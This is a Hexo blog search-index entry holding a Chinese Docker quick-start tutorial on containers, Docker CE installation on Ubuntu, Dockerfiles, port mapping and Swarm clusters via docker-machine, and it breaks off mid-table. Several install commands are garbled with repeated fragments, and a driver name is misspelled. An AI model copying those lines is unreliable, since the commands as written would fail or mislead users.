<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Docker 快速上手</title>
      <link href="/docker-quick-start/"/>
      <url>/docker-quick-start/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记的主要目的是用来记录学习 <code>Docker</code> 的过程。<code>Docker</code>这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。</p><a id="more"></a><h2 id="诞生"><a href="#诞生" class="headerlink" title="诞生"></a>诞生</h2><p>软件开发最大的麻烦事之一，就是环境配置。</p><p>开发者常常说的一句话：它在我的机器上可以跑了。言下之意就是，其他机器可能跑不了。因为可以正常跑的前提是：操作系统的设置，各种软件和组件、库的安装，只有它们都正确了，软件才能正常运行。</p><p>配置环境如此麻烦，换一台机器，就得重来一次，旷日费时。因此，聪明的人们就想到，能不能从根本上解决问题。软件可以带环境安装。（这里说的软件是指最终要运行的工程）</p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>虚拟机（virtual machine，简称VM）就是带环境安装的一种解决方案。它可以在一个操作系统中运行另外一种操作系统。比如在Windows系统中运行Linux 系统。应用程序对此毫无感觉，因为虚拟机看上去跟真是系统一模一样。而对于底层系统来说，虚拟机就是一个普通文件，不需要就删掉，对其他部分没有影响。</p><p><strong>虚拟机（VM）是物理硬件的抽象，</strong> 将一台服务器转变为多台服务器。</p><p>虽然用户可以通过虚拟机还原软件的原始环境，但是这个方案有几个缺点。在后面会做比较。</p><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>由于虚拟机存在一些缺点，Linux 发展出了另一种轻量级的操作系统虚拟化解决方案，Linux 容器（Linux Containers，缩写为 LXC）。</p><p><strong>Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。</strong></p><p><strong>容器是应用层的抽象，它将代码和依赖关系打包在一起。</strong> 多个容器可以在同一台机器上运行，并与其他容器共享操作系统内核，每个容器在用户空间中作为独立进程运行。容器占用的空间比VM少（容器映像的大小通常为几十MB），可以处理更多的应用程序，并且需要更少的VM和操作系统。</p><p>由于容器是进程级别的，相比虚拟机有很多的优势。后面会做比较。</p><h2 id="Docker-是什么"><a href="#Docker-是什么" class="headerlink" title="Docker 是什么"></a>Docker 是什么</h2><p><strong>Docker 属于Linux 容器的一种封装，提供简单易用的容器使用接口。</strong> 它是目前最流行的 Linux 容器解决方案。</p><h3 id="Docker-与虚拟机的区别"><a href="#Docker-与虚拟机的区别" class="headerlink" title="Docker 与虚拟机的区别"></a>Docker 与虚拟机的区别</h3><table><thead><tr><th>名称</th><th>占用资源</th><th>启动速度</th><th>级别</th></tr></thead><tbody><tr><td>Docker</td><td>占用资源少</td><td>启动快</td><td>轻量级</td></tr><tr><td>虚拟机</td><td>占用资源多</td><td>启动慢</td><td>重量级</td></tr></tbody></table><h3 id="Docker-CE-与-Docker-EE"><a href="#Docker-CE-与-Docker-EE" class="headerlink" title="Docker CE 与 Docker EE"></a>Docker CE 与 Docker EE</h3><p><strong>Docker CE(Docker Community Edition)</strong> 是社区版，简单理解是免费使用，提供小企业与小的IT团队使用,希望从Docker开始，并尝试基于容器的应用程序部署。</p><p><strong>Docker EE(Docker Enterprise Edition)</strong> 是企业版，收费。提供功能更强。适合大企业与打的IT团队。为企业开发和IT团队设计，他们在生产中构建、交付和运行业务关键应用程序</p><p>Docker CE 有三种类型的更新通道：stable、test和 nightly</p><ul><li>Stable 提供一般可用性的最新版本</li><li>Test 提供在一般可用之前准备好进行测试的预发布。</li><li>Nightly 提供下一个主要版本的最新正在进行的工作。</li></ul><h2 id="安装-Docker-CE"><a href="#安装-Docker-CE" class="headerlink" title="安装 Docker-CE"></a>安装 Docker-CE</h2><p>这里以Ubuntu 18.04 为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. sudo apt install apt-transport-https ca-certificates software-properties-common curl-transport-https ca-certificates software-properties-common curl</span><br><span class="line">2. curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add --fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -</span><br><span class="line">3. sudo add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \</span><br><span class="line">$(lsb_release -cs) stable&quot;</span><br><span class="line">4. sudo apt update</span><br><span class="line">5. sudo apt install docker-ce</span><br></pre></td></tr></table></figure><p>将当前用户添加到docker 用户组，可以不用sudo 运行docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br><span class="line">$ sudo usermod -aG docker $USER-aG docker $USER</span><br></pre></td></tr></table></figure><h3 id="Docker-镜像"><a href="#Docker-镜像" class="headerlink" title="Docker 镜像"></a>Docker 镜像</h3><p>Docker 镜像就是一个只读的模板。</p><p>例如：一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了 Apache 或用户需要的其它应用程序。</p><p>镜像可以用来创建 Docker 容器。</p><h3 id="Docker-容器"><a href="#Docker-容器" class="headerlink" title="Docker 容器"></a>Docker 容器</h3><p>Docker 利用容器来运行应用。</p><p>容器是从镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。</p><p>可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p><blockquote><p>注：镜像是只读的，容器在启动的时候创建一层可写层作为最上层。</p></blockquote><h3 id="Docker-仓库"><a href="#Docker-仓库" class="headerlink" title="Docker 仓库"></a>Docker 仓库</h3><p>仓库是集中存放镜像文件的场所。有时候会把仓库和仓库注册服务器（Registry）混为一谈，并不严格区分。实际上，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像（image），每个镜像有不同的标签（tag）。</p><p>仓库分为公开仓库（Public）和私有仓库（Private）两种形式。</p><p>最大的公开仓库是 Docker Hub，存放了数量庞大的镜像供用户下载。 国内的公开仓库包括 Docker Pool 等，可以提供大陆用户更稳定快速的访问。</p><p>当然，用户也可以在本地网络内创建一个私有仓库。</p><p>当用户创建了自己的镜像之后就可以使用 push 命令将它上传到公有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只需要从仓库上 pull 下来就可以了。</p><blockquote><p>注：Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。</p></blockquote><h4 id="镜像和容器的区别"><a href="#镜像和容器的区别" class="headerlink" title="镜像和容器的区别"></a>镜像和容器的区别</h4><p>容器和镜像的关系如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200723123056.png" alt=""></p><p><code>Dockerfile</code>用于定义镜像，依赖镜像来运行容器，仓库则是存放镜像的地方。</p><h4 id="Dockerfile-是什么？"><a href="#Dockerfile-是什么？" class="headerlink" title="Dockerfile 是什么？"></a>Dockerfile 是什么？</h4><p>Dockerfile 是一个创建Docker 镜像所需的文件，其中会包含一组指令来告诉Docker 如何构建我们的镜像。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ cat Dockerfile</span><br><span class="line"># 使用官方Python运行时作为父映像</span><br><span class="line">FROM python:2.7-slim</span><br><span class="line"></span><br><span class="line"># 将工作目录设置为&#x2F;app</span><br><span class="line">WORKDIR &#x2F;app</span><br><span class="line"></span><br><span class="line"># 将当前目录内容复制到容器at &#x2F;app</span><br><span class="line">COPY . &#x2F;app</span><br><span class="line"></span><br><span class="line"># 安装requirements.txt中指定的任何需要的包</span><br><span class="line">RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class="line"></span><br><span class="line"># #让80 端口号对外开放</span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line"># 定义环境变量</span><br><span class="line">ENV NAME World</span><br><span class="line"></span><br><span class="line"># 在容器启动时运行app.py</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure><h4 id="如何用镜像创建一个容器？"><a href="#如何用镜像创建一个容器？" class="headerlink" title="如何用镜像创建一个容器？"></a>如何用镜像创建一个容器？</h4><p>首先，我们需要一个镜像，然后才能创建容器。想要在Docker 上创建一个镜像，非常简单。</p><ol><li>cd 到项目文件夹中</li><li>使用 <code>docker build --tag=mydockerapp .</code> 命令，创建一个Docker 镜像。–tag 选项命名。</li><li>使用 <code>docker run -d -p 4000:80 mydockerapp</code>命令，创建一个新容器。</li></ol><p>该命令表示：Docker 以<code>mydockerapp</code>镜像创建一个新容器，同时以分离模式在后台运行该应用程序，将该容器的80端口映射到主机的4000端口。</p><p>其中：<br><code>-d</code>：让容器在后台运行<br><code>-p</code>：将容器内部端口映射到指定的主机端口上。<br><code>-P</code> :是容器内部端口随机映射到主机的端口上。</p><h4 id="Docker-网络端口映射"><a href="#Docker-网络端口映射" class="headerlink" title="Docker 网络端口映射"></a>Docker 网络端口映射</h4><p>使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -p 4000:80 mydocker</span><br></pre></td></tr></table></figure><p>然后用<code>docker container ls</code>查看容器列表</p><p>下图的意思表示：将该容器的端口80映射到4000，从而生成正确的URL <a href="http://localhost:4000。">http://localhost:4000。</a></p><p>Docker 开放了 80 端口映射到主机端口 4000 上。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200723123121.png" alt=""></p><h4 id="Docker-容器连接"><a href="#Docker-容器连接" class="headerlink" title="Docker 容器连接"></a>Docker 容器连接</h4><p>前面我们实现了通过网络端口来访问运行在 docker 容器内的服务。下面我们来实现通过端口连接到一个 docker 容器</p><h4 id="如何运行负载均衡应用？"><a href="#如何运行负载均衡应用？" class="headerlink" title="如何运行负载均衡应用？"></a>如何运行负载均衡应用？</h4><p>在开始之前，你得首先满足以下条件：</p><ol><li>安装Docker 1.13或更高版本。</li><li>了解如何创建容器。</li><li>确保已经创建镜像并发布到注册表。我们在这里需要使用该共享镜像。</li><li>确保镜像作为已部署的容器运行，并能访问。</li></ol><p>确保有<code>docker-compose.yml</code>配置文件，然后依次执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init</span><br><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br><span class="line"># 顺利的话，就能直接部署成功了。使用docker container ls 可以看到正在运行的实例。</span><br><span class="line"># 使用 curl http:&#x2F;&#x2F;localhost:4000 或者是刷新浏览器。</span><br><span class="line"># 无论以哪种方式，容器ID 都会发生变化。从而证明负载均衡成功。</span><br><span class="line"># 对于每个请求，以循环方式选择5个任务中的一个来响应。</span><br><span class="line"># 容器ID与上一个命令（docker container ls -q）的输出匹配。</span><br></pre></td></tr></table></figure><h4 id="关于服务"><a href="#关于服务" class="headerlink" title="关于服务"></a>关于服务</h4><p>在分布式应用程序中，应用程序的不同部分称为“服务”。例如，如果您想象一个视频共享站点，它可能包括一个用于在数据库中存储应用程序数据的服务，一个用户在上传内容后在后台进行视频转码的服务，一个用于前端的服务，等等。</p><p>服务实际上只是“生产中的容器”。服务只运行一个镜像，但它编码了镜像运行的方式 - 它应该使用哪些端口，应该运行多少个容器副本，以便服务具有所需的容量，以及等等。扩展服务会更改运行该软件的容器实例的数量，从而为流程中的服务分配更多计算资源。</p><p>在服务中运行的单个容器称为任务。任务被赋予以数字递增的唯一ID，最多为replicas您定义 的数量docker-compose.yml。</p><p>幸运的是，使用Docker平台定义，运行和扩展服务非常容易 - 只需编写一个docker-compose.yml文件即可。</p><h4 id="如何在Docker上安装-Docker-Machine？"><a href="#如何在Docker上安装-Docker-Machine？" class="headerlink" title="如何在Docker上安装 Docker Machine？"></a>如何在Docker上安装 Docker Machine？</h4><p>Ubuntu 18.04 请看文末的参考链接。</p><p>MacOS 如果是从<a href="https://hub.docker.com/" target="_blank" rel="noopener"><code>DockerHub</code>官网</a>下载的<code>dmg</code> 安装的Docker，不用担心，<code>Docker-Machine</code> 已经安装好了。</p><h4 id="如何安装VirtualBox？"><a href="#如何安装VirtualBox？" class="headerlink" title="如何安装VirtualBox？"></a>如何安装VirtualBox？</h4><p>Ubuntu 18.04 请看文末的参考链接。</p><p>MacOS 则需要从<a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener"><code>virtualbox</code>官网</a>下载dmg安装包。</p><p>你可能会遇到一个错误，参考解决：<a href="http://osxdaily.com/2018/12/31/install-run-virtualbox-macos-install-kernel-fails/" target="_blank" rel="noopener">如何在MacOS上安装VirtualBox</a></p><h3 id="了解Swarm集群"><a href="#了解Swarm集群" class="headerlink" title="了解Swarm集群"></a>了解Swarm集群</h3><p>群由多个节点组成，可以是物理或虚拟机。基本概念很简单：运行<code>docker swarm init</code>以启用<code>swarm模式</code>并使当前计算机成为一个<code>swarm管理器</code>。</p><p>这个章节是这个文档系列中学的时间最长的，坑有点多，走了不少弯路，这一节也挺重要的 重点记下笔记。</p><p>在MacOS 下，部分命令需要 sudo 权限。</p><h4 id="创建一个集群（本地计算机的VM）"><a href="#创建一个集群（本地计算机的VM）" class="headerlink" title="创建一个集群（本地计算机的VM）"></a>创建一个集群（本地计算机的VM）</h4><p>在开始这部分之前，需要提前安装好<code>Oracle VirtualBox</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine create --driver virutalbox myvm1</span><br></pre></td></tr></table></figure><p>如果你收到了这样的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ Error with pre-create check: </span><br><span class="line">&quot;VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path&quot;</span><br></pre></td></tr></table></figure><p>说明你的<code>Vritualbox</code>还是没有安装好。</p><p>查看正在运行的VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ls</span><br><span class="line">NAME    ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORS</span><br><span class="line">myvm1   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.104:2376           v17.06.2-ce</span><br><span class="line">myvm2   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.105:2376           v17.06.2-ce</span><br></pre></td></tr></table></figure><p>这样就成功的创建了一台VM，接下来我们要将这台机器作为管理器，第二台作为工作者。</p><p>另外值得一提的是，尽管我在Ubuntu 18.04 上分别安装好了docker-machine、virtualbox，但当我创建 VM 时，总是会提示我计算机没有开启什么虚拟化（BOIS）。</p><p>后来我大概想明白了，可能是我的那台服务器的配置太低了，真的是某个设置项没有启动导致的。</p><p>今天在MacBook 上重新操作了一边，异常顺利。</p><p>记录一个问题：使用<code>docker-machine create --driver virtualbox myvm1</code>创建VM时，创建成功了，但是并不是我想要的实例。得到了以下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(default) Creating a new host-only adapter produced an error: hostonlyif create failed:</span><br><span class="line">(default) 0%...</span><br><span class="line">(default) Progress state: E_FAIL</span><br><span class="line">(default) VBoxManage.exe: error: Failed to create the host-only adapter</span><br></pre></td></tr></table></figure><p>找了好久也没有找到答案，最后是怎么解决的呢？重启机器（加上 sudo）。</p><p>启动\停止 VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine start Name</span><br><span class="line">$ docker-machine stop Name</span><br></pre></td></tr></table></figure><h4 id="初始化Swarm-并添加节点"><a href="#初始化Swarm-并添加节点" class="headerlink" title="初始化Swarm 并添加节点"></a>初始化Swarm 并添加节点</h4><p>这里是一个小坑，之前在这里栽了好久。</p><p>这里有两种方式初始化节点或者说操作 VM（推荐第一种）：</p><ol><li><p>ssh 连接VM 实例，在Docker VM Cli 中执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;</span><br><span class="line"># &lt;myvm1 ip&gt; 指docker-machine ls 对应的 ip</span><br><span class="line"></span><br><span class="line"># 正常会得到这样一个输出</span><br><span class="line">To add a worker to this swarm, run the following command:</span><br><span class="line">   docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377</span><br></pre></td></tr></table></figure><h4 id="将myvm2-实例作为工作者加入（方式一）"><a href="#将myvm2-实例作为工作者加入（方式一）" class="headerlink" title="将myvm2 实例作为工作者加入（方式一）"></a>将myvm2 实例作为工作者加入（方式一）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker swarm join </span><br><span class="line">--token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo </span><br><span class="line">192.168.99.103:2377</span><br><span class="line"></span><br><span class="line"># 成功，会得到这样的输出</span><br><span class="line">This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure></li><li><p>直接通过 <code>docker-machine ssh myvm1</code> 执行相应命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;</span><br><span class="line"># 同上</span><br></pre></td></tr></table></figure><h4 id="将myvm2-实例作为工作者加入（方式二）"><a href="#将myvm2-实例作为工作者加入（方式二）" class="headerlink" title="将myvm2 实例作为工作者加入（方式二）"></a>将myvm2 实例作为工作者加入（方式二）</h4><p>执行上面得到的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm2 &quot; docker swarm join </span><br><span class="line">--token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo </span><br><span class="line">192.168.99.103:2377&quot;</span><br><span class="line"></span><br><span class="line"># 成功，会得到这样的输出</span><br><span class="line">This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure><p>这样，我们就成功的创建了一个集群，并将一个工作者作为一个节点加入了。</p></li></ol><h5 id="在管理器上查看集群中的节点："><a href="#在管理器上查看集群中的节点：" class="headerlink" title="在管理器上查看集群中的节点："></a>在管理器上查看集群中的节点：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker@myvm1: $ docker node ls</span><br><span class="line">ID                            HOSTNAME     STATUS       AVAILABILITY        MANAGER STATUS</span><br><span class="line">rihwohkh3ph38fhillhhb84sk *   myvm1        Ready        Active              Leader</span><br><span class="line">brtu9urxwfd5j0zrmkubhpkbd     myvm2        Ready        Active</span><br></pre></td></tr></table></figure><p>为什么上面要介绍那两种与 VM 实例进行交互的方式呢？</p><p>因为会和后面的在集群部署应用程序有一定联系。</p><h4 id="在集群中部署应用程序"><a href="#在集群中部署应用程序" class="headerlink" title="在集群中部署应用程序"></a>在集群中部署应用程序</h4><p>在开始部署之前，我们需要了解到有两种方式可以实现。</p><ol><li>docker-machine 为Swarm 管理器配置Shell</li></ol><p>到目前为止，我们与 VM 通信都是通过 <code>docker-machine ssh</code>这种方式，另一种更好的方式就是：将当前shell配置为与VM上的Docker守护程序通信。</p><p>这样我们就可以直接本地的<code>docker-compose.yml</code>文件远程部署应用程序，而无需将其复制到其他任何位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine env myvm1</span><br><span class="line">export DOCKER_TLS_VERIFY&#x3D;&quot;1&quot;</span><br><span class="line">export DOCKER_HOST&#x3D;&quot;tcp:&#x2F;&#x2F;192.168.99.100:2376&quot;</span><br><span class="line">export DOCKER_CERT_PATH&#x3D;&quot;&#x2F;Users&#x2F;sam&#x2F;.docker&#x2F;machine&#x2F;machines&#x2F;myvm1&quot;</span><br><span class="line">export DOCKER_MACHINE_NAME&#x3D;&quot;myvm1&quot;</span><br><span class="line"># Run this command to configure your shell:</span><br><span class="line"># eval $(docker-machine env myvm1)</span><br><span class="line"></span><br><span class="line"># 运行最后一行命令以配置与之通信的 shell </span><br><span class="line">$ eval $(docker-machine env myvm1) # eval $(sudodocker-machine env myvm1)</span><br></pre></td></tr></table></figure><p>运行docker-machine ls 已验证 myvm1 现在是活动的计算机。带有星号（*）表示配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ls</span><br><span class="line">NAME    ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORS</span><br><span class="line">myvm1   *        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.100:2376           v17.06.2-ce</span><br><span class="line">myvm2   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.101:2376           v17.06.2-ce</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">docker-compose.yml</span><br><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br></pre></td></tr></table></figure><ol start="2"><li>传统方式</li></ol><p>传统的方式就是将<code>docker-compose.yml</code>文件拷贝到对应的管理器中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用scp 命令将文件拷贝到 vm 实例中</span><br><span class="line">$ ls</span><br><span class="line">docker-compose.yml</span><br><span class="line">$ docker-machine scp docker-compose.yml myvm1:~</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 这里就可以随意选择使用之前介绍的方式一或者方式二</span><br><span class="line"></span><br><span class="line"># 方式一</span><br><span class="line">$ docker-machine ssh myvm1 &quot;docker stack deploy -c docker-compose.yml getstartedlab&quot;</span><br><span class="line"></span><br><span class="line"># 方式二</span><br><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker stack deploy -c docker-compose.yml</span><br></pre></td></tr></table></figure><p>耐心等待一会，就可以看到看到部署成功了。</p><h4 id="访问集群"><a href="#访问集群" class="headerlink" title="访问集群"></a>访问集群</h4><p>在访问集群之前，你需要知道以下两件事：</p><ul><li>访问集群的IP 地址是VM 的IP，使用<code>docker-machine ls</code>查看</li><li>是否存在端口号，取决于你的<code>docker-compose.yml</code>文件</li></ul><h2 id="Docker-常用命令"><a href="#Docker-常用命令" class="headerlink" title="Docker 常用命令"></a>Docker 常用命令</h2><h3 id="容器的生命周期"><a href="#容器的生命周期" class="headerlink" title="容器的生命周期"></a>容器的生命周期</h3><ul><li>创建一个新的容器并运行：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">$ docker run ubuntu:15.10 &#x2F;bin&#x2F;echo &quot;Hello world&quot;</span><br><span class="line"># 解释：Docker以ubuntu15.10镜像创建一个新容器，然后在容器里执行 bin&#x2F;echo &quot;Hello world&quot;，最后输出结果。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">* -d：让容器在后台运行</span><br><span class="line">* -p：内部容器绑定到指定的主机端口上</span><br><span class="line">* -P：内部容器端口随机映射到主机端口上</span><br><span class="line">* --name：给容器命名，如果不加--name 参数，Docker 会自动命名。</span><br></pre></td></tr></table></figure></li><li>杀掉一个运行中的容器：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker kill -s KILL mydocker</span><br><span class="line"># mydocker 表示Contianer ID或者Name</span><br></pre></td></tr></table></figure></li><li>结束停止一个运行中的容器：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker container stop mydocker</span><br><span class="line"># mydocker 表示Container ID或者Name</span><br></pre></td></tr></table></figure></li><li>查看正在运行的容器：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">* -l：查询最后一次创建容器记录</span><br><span class="line">* --all：查询所有创建容器记录</span><br><span class="line">* -aq：查询所有创建容器的Container ID</span><br></pre></td></tr></table></figure></li><li>停止Web 应用容器</li></ul><p>这个只是停止该容器的运行，并没有杀死</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop mydocker</span><br></pre></td></tr></table></figure><ul><li>启动Web 应用容器</li></ul><p>已经停止的容器，可以使用命令 docker start 来启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker start mydocker</span><br></pre></td></tr></table></figure><ul><li>移除Web 应用容器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker rm mydocker</span><br><span class="line">mydocker</span><br><span class="line"># 删除容器时，容器必须是停止状态，否者会报错。</span><br></pre></td></tr></table></figure><h3 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h3></li><li>如何创建一个Docker 镜像<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build --tag&#x3D;mydockerapp # 注意：标签名只能小写</span><br></pre></td></tr></table></figure></li><li>列出下载到计算机中的镜像<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">hello-world         latest              fce289e99eb9        3 months ago        1.84kB</span><br><span class="line"></span><br><span class="line">各个选项说明:</span><br><span class="line">* REPOSITORY：表示镜像的仓库源</span><br><span class="line"></span><br><span class="line">* TAG：镜像的标签</span><br><span class="line"></span><br><span 